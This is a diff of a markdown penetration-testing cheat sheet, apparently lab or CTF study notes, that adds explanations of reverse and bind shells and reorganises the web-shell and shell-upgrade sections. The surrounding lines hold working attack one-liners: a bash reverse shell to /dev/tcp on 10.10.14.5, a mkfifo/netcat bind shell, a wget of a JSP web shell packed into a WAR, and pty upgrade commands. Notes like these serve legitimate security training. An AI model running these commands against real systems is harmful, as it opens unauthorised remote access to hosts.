@@ -7,6 +7,8 @@ layout: default
 - `nc -lnvp 9999`
 
 # [Reverse Shell](https://www.revshells.com/)
+With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
+
 If we can execute commands on the target, we can try to create MSFVenom payload and execute it inside target
 
 ## Windows
@@ -65,6 +67,9 @@ $ bash -c 'sh -i >%26 /dev/tcp/10.10.14.5/9999 0>%261'`
 * * *
 
 # Bind Shells
+With a bind shell, the target system has a listener started and awaits a connection from a pentester's system.
+
+
 ```bash
 bash
 $ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
@@ -76,7 +81,7 @@ $ nc -nv 10.129.41.200 7777
 * * *
 
 # [Web Shells](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
-`/usr/share/laudanum`
+`copy from /usr/share/laudanum`
 
 ## [PHP](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) 
 ```bash
@@ -84,7 +89,7 @@ $ nc -nv 10.129.41.200 7777
 ```
 
 ## [ASPX Antak Webshell](https://github.com/samratashok/nishang/tree/master/Antak-WebShell)
-`/usr/share/nishang/Antak-WebShell`
+`copy from /usr/share/nishang/Antak-WebShell`
 
 > Antak is a web shell built-in ASP.Net. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server.
 
@@ -106,16 +111,16 @@ $ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/j
 $ zip -r backup.war cmd.jsp 
 ```
 
-## Upgrade Shell
+
+
+# Interactive Shells
 ```bash
+# Python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 "CTRL+Z"
 stty raw -echo; fg
 export TERM=xterm
-```
 
-## Interactive Shells
-```bash
 # /bin/sh -i
 /bin/sh -i
 
